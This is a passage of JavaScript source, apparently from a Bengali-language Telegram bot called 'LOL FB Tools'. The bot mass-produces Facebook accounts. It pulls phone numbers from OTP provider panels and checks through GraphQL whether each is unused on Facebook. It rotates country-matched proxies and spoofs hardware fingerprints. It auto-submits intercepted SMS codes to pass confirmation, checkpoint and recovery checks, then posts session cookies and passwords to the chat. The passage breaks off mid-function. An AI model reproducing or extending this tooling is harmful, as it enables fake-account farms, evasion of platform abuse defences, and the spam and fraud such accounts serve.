        kbRows.push([btnOk('📦 অ্যাকাউন্টস', 'menu:accounts'), btnNav('🛠 FB Tools মেনু', 'menu:fb_tools')]);
      } else {
        kbRows.push([btnBad('🛑 OTP ওয়াচার বন্ধ করুন', 'fbtools:stop_watch')]);
      }
      return { inline_keyboard: kbRows };
    };

    const buildWatchText = (statusMsg) => {
      const elapsed = Date.now() - started;
      const remaining = Math.max(0, timeoutMs - elapsed);
      const pct = Math.min(100, Math.floor((elapsed / timeoutMs) * 100));
      const frame = animFrames[checks % animFrames.length];
      const rows = accounts.map((a, idx) => {
        const icon = a.created ? '✔' : (a.pendingItem ? '🔐' : '✘');
        const badge = a.otpCount > 0 ? `🟢 <b>${a.otpCount} OTP</b>` : '⚪ <i>waiting</i>';
        const lastCode = a.otps.length > 0 ? ` [<code>${escapeHtml(a.otps[a.otps.length - 1].code || 'SMS')}</code>${a.otps[a.otps.length - 1].isLamix ? ' • Lamix' : ''}]` : '';
        return `${idx + 1}. ${icon} <code>+${escapeHtml(a.number)}</code> ${a.uid && a.uid !== '—' ? `(<code>${escapeHtml(a.uid)}</code>)` : ''} • ${badge}${lastCode}`;
      });
      const lines = [
        `👁 <b>LOL LIVE OTP WATCHER · ${accounts.length}টি নাম্বার (Lamix Live)</b>`,
        DIVIDER,
        `${frame} <i>${escapeHtml(statusMsg)}</i>`,
        `📊 PROGRESS <code>[${renderProgressBar(pct, 100, 12)}]</code> <code>${pct}%</code> • ⏰ <code>${fmtClock(remaining)}</code>`,
        `⏳ Checks: <code>${checks}</code>  •  📩 মোট OTP: <code>${totalOtps}</code>  •  ✅ ভেরিফাইড: <code>${verifiedCount}</code>`,
        ``,
        `<b>✦ CREATED / PENDING NUMBERS ✦</b>`,
        ...rows,
      ];
      if (latestOtp) {
        lines.push(
          ``,
          `⚡ <b>NEW OTP RECEIVED${latestOtp.isLamix ? ' (LAMIX PANEL)' : ''}!</b>`,
          `<blockquote>📱 <b>+${escapeHtml(latestOtp.number)}</b>  •  🌐 <code>${escapeHtml(latestOtp.sender)}</code>\n🔑 <b>Code:</b> <code>${escapeHtml(latestOtp.code || 'N/A')}</code>\n💬 <code>${escapeHtml(latestOtp.msg.slice(0, 110))}</code></blockquote>`
        );
      }
      if (otpHistory.length > 0) {
        lines.push(``, `<b>── OTP HISTORY (সর্বশেষ ${Math.min(5, otpHistory.length)}টি) ──</b>`);
        for (const h of otpHistory.slice(-5).reverse()) {
          lines.push(`• <code>+${escapeHtml(h.number)}</code> → 🔑 <code>${escapeHtml(h.code || 'SMS')}</code> (${escapeHtml(h.sender)})`);
        }
      }
      return lines.join('\n');
    };

    const watchRes = await sendMessage(chatId, buildWatchText('সবগুলো নাম্বারের OTP (Lamix সহ) লাইভ চেক করা হচ্ছে...'), buildWatchKeyboard(false));
    const watchMsgId = watchRes.ok ? watchRes.result?.message_id : null;

    while (!fbToolsWatchAbort.get(uidKey)) {
      const elapsed = Date.now() - started;
      if (elapsed >= timeoutMs) break;
      checks += 1;

      const allPendingVerified = accounts.every((a) => !a.pendingItem && a.otpCount > 0);
      if (allPendingVerified && accounts.some((a) => a.created)) {
        break;
      }

      const [res2, lRes, pRes] = await Promise.all([
        use2oo9 ? fetch2oo9SuccessOtps(keys2oo9, voltexUrl).catch(() => ({ ok: false, otps: [] })) : Promise.resolve({ ok: false, otps: [] }),
        lamixTok ? fetchLamixMessages(lamixTok, 100, false).catch(() => ({ ok: false, messages: [] })) : Promise.resolve({ ok: false, messages: [] }),
        hasActivePanels ? fetchAllActivePanelsSms(false).catch(() => ({ ok: false, rows: [] })) : Promise.resolve({ ok: false, rows: [] }),
      ]);

      const incoming = [];
      if (lRes.ok) {
        for (const row of lRes.messages) {
          const f = getLamixMsgFields(row);
          if (!f.number || !f.message) continue;
          const k = `L:${f.id}`;
          if (seenKeys.has(k)) continue;
          incoming.push({ key: k, isLamix: true, number: f.number, sender: sanitizeProviderText(f.sender) || 'Lamix Panel', message: f.message });
        }
      }
      if (res2.ok) {
        for (const row of res2.otps) {
          const k = `2O:${row.id}`;
          if (seenKeys.has(k)) continue;
          incoming.push({ key: k, isLamix: false, number: row.number, sender: sanitizeProviderText(row.sender) || 'Server-1', message: row.message });
        }
      }
      if (pRes.ok) {
        for (const row of pRes.rows) {
          if (!row.number || !row.message) continue;
          const k = `P:${smsRowKey(row)}`;
          if (seenKeys.has(k)) continue;
          incoming.push({ key: k, isLamix: false, number: row.number, sender: sanitizeProviderText(row.sender || row.panelName) || 'OTP Server', message: row.message });
        }
      }

      let gotNew = false;
      for (const sms of incoming) {
        const acc = accounts.find((a) => phoneDigitsMatch(sms.number, a.number));
        if (!acc) continue;
        seenKeys.add(sms.key);
        const code = extractFbOtpFromSms(sms.message);
        const entry = { number: acc.number, sender: sms.sender, msg: sms.message, code, isLamix: sms.isLamix };
        acc.otps.push(entry);
        acc.otpCount += 1;
        otpHistory.push(entry);
        totalOtps += 1;
        latestOtp = entry;
        gotNew = true;

        // If this account had a CONFIRM / CHECKPOINT / RECOVERY form, verify OTP automatically!
        if (acc.pendingItem && code) {
          activeOtpVerifyPhones.add(acc.number);
          try {
            const watchConfirmItem = {
              ...acc.pendingItem,
              proxy: adaptProxyForSession(acc.pendingItem.rawProxy || acc.pendingItem.proxy, {
                iso: acc.countryIso || '',
                autoCountry: true,
                refreshSession: true,
              }).url || acc.pendingItem.proxy,
            };
            const cRes = acc.pendingItem.flow === 'recovery'
              ? await submitRecoveryOtpAndLogin(watchConfirmItem, code, acc.password || acc.pendingItem.pass || cfg.password, cfg)
              : await performOtpConfirm(watchConfirmItem, code, cfg, userCookie);
            if (cRes.status === 'OK') {
              acc.created = true;
              acc.uid = cRes.uid || acc.uid;
              acc.cookie = formatCookieHeader(cRes.cookies || {});
              acc.pendingItem = null;
              verifiedCount += 1;
              if (acc.poolNumberId) consumeClaimedNumber(acc.poolNumberId);
              storeUserAccount(user.id, {
                name: acc.name,
                phone: acc.number,
                pass: acc.password,
                uid: acc.uid,
                status: 'OK',
                confirmed: true,
                engine: 'lol-fbtools',
                cookies: cRes.cookies || {},
              });
              writeUserPending(user.id, readUserPending(user.id).filter((p) => p.phone !== acc.number));
              const uMap = readUsersMap();
              if (uMap[user.id]) {
                uMap[user.id].totalOk += 1;
                writeUsersMap(uMap);
              }
              await sendMessage(
                chatId,
                [
                  `✅ <b>LOL FB TOOLS — OTP ভেরিফাই সফল!${sms.isLamix ? ' (Lamix Panel)' : ''}</b>`,
                  DIVIDER,
                  `👤 <b>নাম:</b> ${escapeHtml(acc.name)}`,
                  `🆔 <b>UID:</b> <code>${escapeHtml(acc.uid)}</code>  •  🔑 <b>OTP:</b> <code>${escapeHtml(code)}</code>`,
                  `📱 <b>নাম্বার:</b> <code>+${escapeHtml(acc.number)}</code>  •  🔒 <b>পাসওয়ার্ড:</b> <code>${escapeHtml(acc.password)}</code>`,
                  acc.hwFp ? `🧬 <b>Hardware FP:</b> <code>MAC ${escapeHtml(acc.hwFp.macAddress)}</code> • <code>${escapeHtml(acc.hwFp.webglVendor)}</code> • <code>${escapeHtml(acc.hwFp.screenResolution)}</code>` : '',
                  `<blockquote>🍪 <code>${escapeHtml(acc.cookie.slice(0, 320))}${acc.cookie.length > 320 ? '...' : ''}</code></blockquote>`,
                ].filter(Boolean).join('\n'),
                {
                  inline_keyboard: [
                    [btnOk('📤 OTP Send (PC Proxy)', `otp:pc_send:${acc.number}`), btnNav('📡 Lamix OTP চেক', `otp:check_lamix:${acc.number}`)],
                    [btnOk('📦 তৈরি হওয়া অ্যাকাউন্টস', 'menu:accounts')],
                  ],
                }
              );
            } else if (cRes.status === 'RETRY') {
              acc.pendingItem = cRes.item;
              upsertUserPending(user.id, cRes.item);
            }
          } finally {
            activeOtpVerifyPhones.delete(acc.number);
          }
        }
      }

      if (watchMsgId) {
        await editMessage(
          chatId,
          watchMsgId,
          buildWatchText(gotNew ? (latestOtp?.isLamix ? 'Lamix Panel-এ নতুন OTP এসেছে!' : 'নতুন OTP এসেছে!') : 'Lamix ও সব সার্ভারে দ্রুত OTP স্ক্যান চলছে...'),
          buildWatchKeyboard(false),
          { throttle: true, noRetry: true, minIntervalMs: gotNew ? 800 : 2500 }
        );
      }

      if (accounts.length > 0 && accounts.every((a) => a.created && !a.pendingItem && a.otpCount > 0)) {
        break;
      }

      await new Promise((r) => setTimeout(r, 950));
    }

    const stopped = Boolean(fbToolsWatchAbort.get(uidKey));
    fbToolsWatchAbort.delete(uidKey);
    if (watchMsgId) {
      await editMessage(
        chatId,
        watchMsgId,
        buildWatchText(stopped ? 'ইউজার OTP ওয়াচার বন্ধ করেছেন।' : 'OTP ওয়াচার সম্পন্ন হয়েছে।'),
        buildWatchKeyboard(true)
      );
    }
    return { otpsReceived: totalOtps, verifiedCount, stopped };
  }

  async function startFbToolsBatch(chatId, user, opts = {}) {
    const existing = activeRuns.get(user.id);
    if (existing?.running) {
      await sendMessage(chatId, '⚠️ আগে থেকে একটি কাজ চলছে। নতুন কাজ শুরুর আগে সেটি বন্ধ করুন।', {
        inline_keyboard: [[btnBad('🛑 চলমান কাজ বন্ধ করুন', 'menu:stop'), btnNav('⬅️ FB Tools', 'menu:fb_tools')]],
      });
      return;
    }

    const cfg = readUserConfig(user.id);
    const password = resolveFbToolsPassword(cfg);
    if (!password || password.length < 6) {
      await sendMessage(chatId, '⚠️ আগে কমপক্ষে ৬ অক্ষরের একটি পাসওয়ার্ড সেট করুন।', {
        inline_keyboard: [[btnOk('🔑 পাসওয়ার্ড সেট করুন', 'fbtools:setpw'), btnNav('⬅️ FB Tools', 'menu:fb_tools')]],
      });
      return;
    }

    const source = ['2oo9', 'pool', 'lamix', 'custom'].includes(opts.source || cfg.fb_tools_source)
      ? (opts.source || cfg.fb_tools_source)
      : '2oo9';
    const keys2oo9 = resolveFbTools2oo9Keys();
    const lamixTok = resolveFbToolsLamixToken();
    const voltexUrl = resolveFbToolsVoltexUrl();
    const rangeId = opts.rangeId || (source === '2oo9' ? cfg.fb_tools_2oo9_range : cfg.fb_tools_lamix_range) || '';
    const rangeLabel = opts.rangeLabel || (source === '2oo9' ? cfg.fb_tools_2oo9_range_label : cfg.fb_tools_lamix_label) || rangeId;
    const rangeSid = opts.sid || cfg.fb_tools_2oo9_sid || 'facebook';
    const countryId = opts.countryId || cfg.fb_tools_country_id;
    let country = countryId ? findCountryById(countryId) : null;

    let lamixCandidates = [];
    let customQueue = Array.isArray(opts.customNumbers) ? [...opts.customNumbers] : [];
    let lamixRangePrefix = opts.rangePrefix || (source === 'lamix' ? (cfg.fb_tools_lamix_prefix || '') : '');

    if (source === '2oo9') {
      if (keys2oo9.length === 0) {
        await sendMessage(chatId, '⚠️ <b>LOL সার্ভার ১</b> এখনো অ্যাডমিন কনফিগার করেনি। অনুগ্রহ করে অন্য সার্ভার ব্যবহার করুন।', {
          inline_keyboard: [[btnNav('⚙️ সার্ভার বদলান', 'fbtools:source_menu'), btnNav('⬅️ FB Tools', 'menu:fb_tools')]],
        });
        return;
      }
      if (!rangeId) {
        await sendMessage(chatId, '⚠️ আগে LOL সার্ভার ১ থেকে একটি দেশ / রেঞ্জ বাছাই করুন।', {
          inline_keyboard: [[btnOk('🌐 দেশ / রেঞ্জ বাছাই করুন', 'fbtools:2oo9_ranges:0'), btnNav('⬅️ FB Tools', 'menu:fb_tools')]],
        });
        return;
      }
    } else if (source === 'lamix') {
      if (!lamixTok) {
        await sendMessage(chatId, '⚠️ <b>LOL সার্ভার ২</b> এখনো অ্যাডমিন কনফিগার করেনি। অনুগ্রহ করে অন্য সার্ভার ব্যবহার করুন।', {
          inline_keyboard: [[btnNav('⚙️ সার্ভার বদলান', 'fbtools:source_menu'), btnNav('⬅️ FB Tools', 'menu:fb_tools')]],
        });
        return;
      }
      if (!rangeId) {
        await sendMessage(chatId, '⚠️ আগে LOL সার্ভার ২ থেকে একটি রেঞ্জ বাছাই করুন।', {
          inline_keyboard: [[btnOk('📘 রেঞ্জ দেখুন', 'fbtools:ranges:0'), btnNav('⬅️ FB Tools', 'menu:fb_tools')]],
        });
        return;
      }
    } else if (source === 'pool') {
      if (!country) {
        const avail = getCountryInventoryStats().find((c) => c.available > 0);
        if (avail) {
          country = findCountryById(avail.id);
          writeUserConfig(user.id, { fb_tools_country_id: avail.id });
        }
      }
      if (!country) {
        await sendMessage(chatId, '⚠️ অ্যাডমিন পুলে এখন কোনো দেশ/নাম্বার খালি নেই।', {
          inline_keyboard: [[btnNav('⚙️ সার্ভার বদলান', 'fbtools:source_menu'), btnNav('⬅️ FB Tools', 'menu:fb_tools')]],
        });
        return;
      }
    } else if (customQueue.length === 0) {
      await sendMessage(chatId, '⚠️ কোনো কাস্টম নাম্বার পাওয়া যায়নি।', {
        inline_keyboard: [[btnOk('📝 নাম্বার পেস্ট করুন', 'fbtools:custom_nums'), btnNav('⬅️ FB Tools', 'menu:fb_tools')]],
      });
      return;
    }

    const totalTarget = source === 'custom'
      ? Math.min(25, customQueue.length)
      : Math.max(1, Math.min(15, Number(opts.count) || 1));

    const quota = canConsumeQuota(user.id, totalTarget);
    if (!quota.ok) {
      await sendMessage(
        chatId,
        `⛔ আপনার আজকের লিমিট শেষ! বাকি আছে: <code>${quota.remaining}</code>টি।`,
        { inline_keyboard: [[btnNav('⬅️ FB Tools', 'menu:fb_tools')]] }
      );
      return;
    }

    fbToolsLastBatchConfig.set(user.id, {
      source,
      count: totalTarget,
      rangeId,
      rangeLabel,
      sid: rangeSid,
      countryId: country?.id || null,
    });

    const runState = {
      running: true,
      abortRequested: false,
      total: totalTarget,
      completed: 0,
      okCount: 0,
      pendingCount: 0,
      failCount: 0,
      currentNumber: null,
      startedAt: Date.now(),
    };
    activeRuns.set(user.id, runState);

    const srcBanner = source === '2oo9'
      ? (rangeLabel || rangeId)
      : source === 'lamix'
      ? (rangeLabel || rangeId)
      : source === 'pool'
      ? (country?.name || 'Admin Pool')
      : 'কাস্টম নাম্বার';

    const progRes = await sendMessage(
      chatId,
      [
        `🛠 <b>LOL FB TOOLS • টার্বো মোড (${totalTarget}টি অ্যাকাউন্ট)</b>`,
        DIVIDER,
        `📦 <b>সার্ভার / রেঞ্জ:</b> <code>${escapeHtml(srcBanner)}</code>`,
        `📊 PROGRESS <code>[${renderProgressBar(0, totalTarget)}]</code> (<code>0/${totalTarget}</code>)`,
        `⚡ একসাথে প্যারালাল <b>3x GQL + Multi-Thread</b> প্রসেস চালু হচ্ছে...`,
      ].join('\n'),
      { inline_keyboard: [[btnBad('🛑 কাজ বন্ধ করুন', 'menu:stop')]] }
    );
    const progMsgId = progRes.ok ? progRes.result?.message_id : null;

    pushBotLog(`User ${user.id} started LOL FB Tools TURBO batch (${totalTarget}, source=${source})`);
    appendUserLog(user.id, `FB TOOLS TURBO STARTED: ${totalTarget} account(s), source=${source}`);

    (async () => {
      try {
        const proxyPool = getEffectiveProxyPool(user.id);
        const userBaseCookie = readUserCookies(user.id);
        const badProxies = new Set();
        const usedNumbers = new Set();
        const readyFreeQueue = [];
        const accounts = [];
        let lamixIdx = 0;

        const otpResendRounds = Math.max(1, Math.min(10, Number(cfg.fb_tools_otp_resends ?? 5)));
        const autoReplaceOn = cfg.fb_tools_auto_replace !== false;
        const maxReplacePerSlot = source === 'custom' ? 25 : (autoReplaceOn ? 4 : 1);
        const seenSmsKeys = new Set();
        const use2oo9Sms = (source === '2oo9' || keys2oo9.length > 0) && keys2oo9.length > 0;
        const hasActivePanels = readPanelsStore().panels.some((p) => p.active !== false);

        // Parallel startup: validate/fetch provider numbers + warm GQL session + pre-seed SMS history simultaneously!
        const ensure2oo9ProbeP = source === '2oo9'
          ? fetch2oo9LiveAccess(keys2oo9, voltexUrl).catch((e) => ({ ok: false, error: e?.message || 'Server error', records: [] }))
          : Promise.resolve({ ok: true });

        const loadLamixStartupP = source === 'lamix'
          ? (async () => {
              if (!lamixRangePrefix) {
                const cachedRanges = fbToolsLamixRangeCache.get(user.id)?.ranges || [];
                let matchedRange = cachedRanges.find((r) => r.id === rangeId || r.range === rangeId);
                if (!matchedRange) {
                  const rRes = await fetchLamixRanges(lamixTok);
                  if (rRes.ok && rRes.ranges.length > 0) {
                    fbToolsLamixRangeCache.set(user.id, { ts: Date.now(), ranges: rRes.ranges });
                    matchedRange = rRes.ranges.find((r) => r.id === rangeId || r.range === rangeId);
                  }
                }
                if (matchedRange?.clean_range) {
                  lamixRangePrefix = matchedRange.clean_range;
                  writeUserConfig(user.id, { fb_tools_lamix_prefix: lamixRangePrefix });
                }
              }
              lamixCandidates = await fetchLamixNumbers(lamixTok, rangeId, 100, 2, lamixRangePrefix, {
                wantMin: Math.max(45, totalTarget * 5),
              });
              if (lamixRangePrefix) {
                lamixCandidates = lamixCandidates.filter((c) => c.full_number.startsWith(lamixRangePrefix));
              }
              for (let i = lamixCandidates.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [lamixCandidates[i], lamixCandidates[j]] = [lamixCandidates[j], lamixCandidates[i]];
              }
            })()
          : Promise.resolve();

        const [probe2oo9, , , pre2, preL, preP] = await Promise.all([
          ensure2oo9ProbeP,
          loadLamixStartupP,
          harvestGqlSessionDirect(false, { timeoutMs: 7000 }).catch(() => null),
          use2oo9Sms ? fetch2oo9SuccessOtps(keys2oo9, voltexUrl).catch(() => ({ ok: false, otps: [] })) : Promise.resolve({ ok: false, otps: [] }),
          lamixTok ? fetchLamixMessages(lamixTok, 100, false).catch(() => ({ ok: false, messages: [] })) : Promise.resolve({ ok: false, messages: [] }),
          hasActivePanels ? fetchAllActivePanelsSms(false).catch(() => ({ ok: false, rows: [] })) : Promise.resolve({ ok: false, rows: [] }),
        ]);

        if (source === '2oo9' && !probe2oo9.ok) {
          runState.running = false;
          if (progMsgId) {
            await editMessage(
              chatId,
              progMsgId,
              `❌ <b>LOL সার্ভার ১ কানেকশন ব্যর্থ:</b> <code>${escapeHtml(sanitizeProviderText(probe2oo9.error || 'Server Error'))}</code>\nঅন্য সার্ভার ব্যবহার করুন অথবা অ্যাডমিনকে জানান।`,
              { inline_keyboard: [[btnNav('⚙️ সার্ভার বদলান', 'fbtools:source_menu'), btnNav('⬅️ FB Tools', 'menu:fb_tools')]] }
            );
          }
          return;
        }
        if (source === 'lamix' && lamixCandidates.length === 0) {
          runState.running = false;
          if (progMsgId) {
            await editMessage(
              chatId,
              progMsgId,
              `❌ সিলেক্টেড LOL সার্ভার ২ রেঞ্জে (<b>${escapeHtml(rangeLabel || rangeId)}</b>${lamixRangePrefix ? ` • +${escapeHtml(lamixRangePrefix)}` : ''}) কোনো ফ্রি নাম্বার পাওয়া যায়নি।`,
              { inline_keyboard: [[btnOk('📘 অন্য রেঞ্জ দেখুন', 'fbtools:ranges:0'), btnNav('⬅️ FB Tools', 'menu:fb_tools')]] }
            );
          }
          return;
        }

        if (pre2.ok) {
          for (const row of pre2.otps) seenSmsKeys.add(`2O:${row.id}`);
        }
        if (preL.ok) {
          for (const row of preL.messages) {
            const f = getLamixMsgFields(row);
            if (f.id) seenSmsKeys.add(`L:${f.id}`);
          }
        }
        if (preP.ok) {
          for (const row of preP.rows) seenSmsKeys.add(`P:${smsRowKey(row)}`);
        }

        const updateBatchProgress = async (statusLine, force = false) => {
          if (!progMsgId) return;
          await editMessage(
            chatId,
            progMsgId,
            [
              `🛠 <b>LOL FB TOOLS • টার্বো স্পিড ইঞ্জিন</b>`,
              DIVIDER,
              statusLine,
              `📊 PROGRESS <code>[${renderProgressBar(runState.completed, totalTarget)}]</code> (<code>${runState.completed}/${totalTarget}</code>)`,
              `✅ তৈরি: <code>${runState.okCount}</code>  •  🔐 OTP অপেক্ষা: <code>${runState.pendingCount}</code>  •  ❌ ব্যর্থ: <code>${runState.failCount}</code>`,
            ].join('\n'),
            { inline_keyboard: [[btnBad('🛑 কাজ বন্ধ করুন', 'menu:stop')]] },
            { throttle: true, noRetry: true, minIntervalMs: force ? 700 : 1800 }
          );
        };

        const pollOtpForNumber = async (targetNumber, waitMs = 2000) => {
          const deadline = Date.now() + Math.max(600, waitMs);
          while (!runState.abortRequested) {
            const [res2, lRes, pRes] = await Promise.all([
              use2oo9Sms ? fetch2oo9SuccessOtps(keys2oo9, voltexUrl, false).catch(() => ({ ok: false, otps: [] })) : Promise.resolve({ ok: false, otps: [] }),
              lamixTok ? fetchLamixMessages(lamixTok, 100, false).catch(() => ({ ok: false, messages: [] })) : Promise.resolve({ ok: false, messages: [] }),
              hasActivePanels ? fetchAllActivePanelsSms(false).catch(() => ({ ok: false, rows: [] })) : Promise.resolve({ ok: false, rows: [] }),
            ]);

            const incoming = [];
            if (lRes.ok) {
              for (const row of lRes.messages) {
                const f = getLamixMsgFields(row);
                if (!f.number || !f.message) continue;
                const k = `L:${f.id}`;
                if (seenSmsKeys.has(k)) continue;
                incoming.push({ key: k, isLamix: true, number: f.number, sender: sanitizeProviderText(f.sender) || 'Lamix Panel', message: f.message });
              }
            }
            if (res2.ok) {
              for (const row of res2.otps) {
                const k = `2O:${row.id}`;
                if (seenSmsKeys.has(k)) continue;
                incoming.push({ key: k, isLamix: false, number: row.number, sender: sanitizeProviderText(row.sender) || 'Server-1', message: row.message });
              }
            }
            if (pRes.ok) {
              for (const row of pRes.rows) {
                if (!row.number || !row.message) continue;
                const k = `P:${smsRowKey(row)}`;
                if (seenSmsKeys.has(k)) continue;
                incoming.push({ key: k, isLamix: false, number: row.number, sender: sanitizeProviderText(row.sender || row.panelName) || 'OTP Server', message: row.message });
              }
            }

            for (const sms of incoming) {
              if (!phoneDigitsMatch(sms.number, targetNumber)) continue;
              seenSmsKeys.add(sms.key);
              const code = extractFbOtpFromSms(sms.message);
              if (code) {
                return { code, sms };
              }
            }

            if (Date.now() >= deadline) break;
            if (!(await sleepAbort(850, () => runState.abortRequested))) break;
          }
          return null;
        };

        const pullCandidatesBatch = async (batchSize = 3) => {
          const picked = [];
          if (source === '2oo9') {
            const resList = await Promise.all(
              Array.from({ length: batchSize }, () => fetch2oo9LiveNumber(keys2oo9, rangeId, rangeSid, voltexUrl).catch(() => ({ ok: false, number: '' })))
            );
            for (const gRes of resList) {
              if (!gRes?.ok || !gRes.number) continue;
              if (usedNumbers.has(gRes.number)) continue;
              usedNumbers.add(gRes.number);
              picked.push({ candidate: gRes.number, poolId: null });
            }
          } else if (source === 'lamix') {
            while (lamixIdx < lamixCandidates.length && picked.length < batchSize) {
              const cand = lamixCandidates[lamixIdx++];
              if (lamixRangePrefix && !cand.full_number.startsWith(lamixRangePrefix)) continue;
              if (!usedNumbers.has(cand.full_number)) {
                usedNumbers.add(cand.full_number);
                picked.push({ candidate: cand.full_number, poolId: null });
              }
            }
          } else if (source === 'pool') {
            const claimed = claimAvailableNumbers(user.id, country.id, batchSize);
            for (const item of claimed || []) {
              if (usedNumbers.has(item.number)) {
                consumeClaimedNumber(item.id);
                continue;
              }
              usedNumbers.add(item.number);
              picked.push({ candidate: item.number, poolId: item.id });
            }
          } else {
            while (customQueue.length > 0 && picked.length < batchSize) {
              const cNum = String(customQueue.shift() || '').replace(/\D/g, '');
              if (cNum && !usedNumbers.has(cNum)) {
                usedNumbers.add(cNum);
                picked.push({ candidate: cNum, poolId: null });
              }
            }
          }
          return picked;
        };

        const acquireFreeNumber = async (slotIdx) => {
          if (readyFreeQueue.length > 0) {
            return readyFreeQueue.shift();
          }
          const maxRounds = 6;
          const batchSize = 3;
          const hintCountry = rangeLabel || country?.name || '';

          for (let round = 1; round <= maxRounds && !runState.abortRequested; round++) {
            if (readyFreeQueue.length > 0) {
              return readyFreeQueue.shift();
            }
            const batch = await pullCandidatesBatch(batchSize);
            if (batch.length === 0) {
              if (source === '2oo9') {
                await sleepAbort(150, () => runState.abortRequested);
                continue;
              }
              return null;
            }

            void updateBatchProgress(
              `🔍 <b>[${slotIdx}/${totalTarget}] প্যারালাল 3x GQL যাচাই:</b> <code>+${escapeHtml(batch[0].candidate)}</code>${batch.length > 1 ? ` (+${batch.length - 1})` : ''}`,
              round === 1 && slotIdx === 1
            );

            const checked = await Promise.all(
              batch.map(async (entry, idx) => {
                const { candidate, poolId } = entry;
                const det = detectCountryFromNumber(`+${candidate}`, cfg.cc, hintCountry);
                const fallbackIso = countryNameToIso(hintCountry) || (det?.iso && det.iso !== '??' ? det.iso : getCountryInfo(cfg.cc)[1]);
                const resolvedIso = det?.iso && det.iso !== '??' ? det.iso : fallbackIso;
                const px = cfg.gql_via_direct !== false
                  ? null
                  : (proxyPool.length > 0 ? selectSmartProxy(proxyPool, round * 3 + idx, badProxies, cfg.proxy_mode || 'rotate', cfg.proxy || null, resolvedIso) : cfg.proxy || null);
                let gql;
                try {
                  gql = await checkNumberGraphql(`+${candidate}`, {
                    cc: det?.cc || cfg.cc,
                    proxy: px,
                    strictProxy: cfg.strict_proxy !== false,
                    timeoutMs: 4500,
                    shouldAbort: () => runState.abortRequested,
                  });
                } catch {
                  gql = { status: 'unknown' };
                }
                return { candidate, poolId, det, resolvedIso, gql };
              })
            );

            const freeHits = [];
            for (const item of checked) {
              if (item.gql.status === 'free') {
                if (source === 'lamix') {
                  assignLamixNumber(lamixTok, item.candidate).catch(() => {});
                }
                freeHits.push({
                  number: item.candidate,
                  poolNumberId: item.poolId,
                  det: item.det || { cc: cfg.cc, iso: item.resolvedIso, name: hintCountry || 'Unknown' },
                  iso: item.resolvedIso,
                });
              } else {
                appendUserLog(user.id, `FB TOOLS GQL ${item.gql.status.toUpperCase()} +${item.candidate} -> skipping`);
                if (source === 'pool' && item.poolId) {
                  consumeClaimedNumber(item.poolId);
                }
              }
            }

            if (freeHits.length > 0) {
              const first = freeHits.shift();
              for (const extra of freeHits) readyFreeQueue.push(extra);
              return first;
            }
          }
          return readyFreeQueue.length > 0 ? readyFreeQueue.shift() : null;
        };

        const sendReadyAccountCard = async (slotNum, acc, otpCode = '', otpSource = '') => {
          const srcNote = otpSource ? ` (${escapeHtml(otpSource)})` : '';
          await sendMessage(
            chatId,
            [
              `✅ <b>ACCOUNT #${slotNum} — CREATED &amp; VERIFIED</b>`,
              DIVIDER,
              `👤 <b>NAME:</b> ${escapeHtml(acc.name)}`,
              `🆔 <b>UID:</b> <code>${escapeHtml(acc.uid)}</code>${otpCode ? `  •  🔑 <b>OTP:</b> <code>${escapeHtml(otpCode)}</code>${srcNote}` : ''}`,
              `📱 <b>NUMBER:</b> <code>+${escapeHtml(acc.number)}</code>`,
              `🔒 <b>PASSWORD:</b> <code>${escapeHtml(password)}</code>`,
              acc.countryIso ? `🌐 <b>PROXY COUNTRY:</b> <code>${escapeHtml(acc.countryIso)}</code>` : '',
              acc.browserProfile ? `🖥 <b>BROWSER:</b> <code>${escapeHtml(acc.browserProfile)}</code>` : '',
              acc.hwFp ? `🧬 <b>HARDWARE FP:</b> <code>MAC ${escapeHtml(acc.hwFp.macAddress)}</code> • <code>${escapeHtml(acc.hwFp.webglVendor)}</code> • <code>${escapeHtml(acc.hwFp.screenResolution)}</code>` : '',
              `<blockquote><b>FULL COOKIE:</b>\n<code>${escapeHtml(acc.cookie.slice(0, 400))}${acc.cookie.length > 400 ? '...' : ''}</code></blockquote>`,
            ].filter(Boolean).join('\n'),
            {
              inline_keyboard: [
                [
                  btnOk('📤 OTP Send (PC Proxy)', `otp:pc_send:${acc.number}`),
                  btnNav('📡 Lamix OTP চেক', `otp:check_lamix:${acc.number}`),
                ],
                [btnOk('📦 তৈরি হওয়া অ্যাকাউন্টস', 'menu:accounts')],
              ],
            }
          );
        };

        const sendPendingAccountCard = async (slotNum, acc, viaNote = '') => {
          await sendMessage(
            chatId,
            [
              `🔔 <b>ACCOUNT #${slotNum} — OTP READY / WATCHING</b>`,
              DIVIDER,
              `👤 <b>NAME:</b> ${escapeHtml(acc.name)}`,
              `📱 <b>NUMBER:</b> <code>+${escapeHtml(acc.number)}</code> [${isoToFlag(acc.countryIso)} <b>${escapeHtml(acc.countryIso)}</b>]`,
              `🔒 <b>PASSWORD:</b> <code>${escapeHtml(password)}</code>${viaNote ? `  •  ⚡ <code>${escapeHtml(viaNote)}</code>` : ''}`,
              `📡 <i>Lamix Panel-এ অটো-ওয়াচ চলছে। সাথে সাথে OTP রিসেন্ট করতে নিচের <b>OTP Send (PC Proxy)</b> চাপুন।</i>`,
            ].join('\n'),
            {
              inline_keyboard: [
                [
                  btnOk('📤 OTP Send (PC Proxy)', `otp:pc_send:${acc.number}`),
                  btnNav('📡 Lamix OTP চেক', `otp:check_lamix:${acc.number}`),
                ],
                [
                  btnOk(`🔑 OTP দিন`, `otp:enter:${acc.number}`),
                  btnNav(`🔎 Check Login`, `otp:check:${acc.number}`),
                ],
              ],
            }
          );
        };

        const workerCount = Math.min(totalTarget, Math.max(4, Math.min(8, Number(cfg.threads || 6))));
        let nextSlotIdx = 0;

        const runWorkerSlot = async () => {
          while (!runState.abortRequested) {
            const i = ++nextSlotIdx;
            if (i > totalTarget) break;
            let slotResolved = false;

            for (let replaceTry = 1; replaceTry <= maxReplacePerSlot && !runState.abortRequested && !slotResolved; replaceTry++) {
              const picked = await acquireFreeNumber(i);
              if (!picked) {
                void updateBatchProgress(`⚠️ #${i}/${totalTarget} এর জন্য আর ফ্রি নাম্বার পাওয়া যায়নি।`, true);
                break;
              }

              const fullNum = picked.number;
              runState.currentNumber = fullNum;
              const countryHint = picked.det?.name || rangeLabel || country?.name || '';
              const numIso = picked.iso || picked.det?.iso || countryNameToIso(countryHint) || getCountryInfo(cfg.cc)[1];
              const px = proxyPool.length > 0
                ? selectSmartProxy(proxyPool, i + replaceTry - 1, badProxies, cfg.proxy_mode || 'rotate', cfg.proxy || null, numIso)
                : cfg.proxy || null;
              const pxPreview = adaptProxyForSession(px, { iso: numIso, autoCountry: true, refreshSession: true });

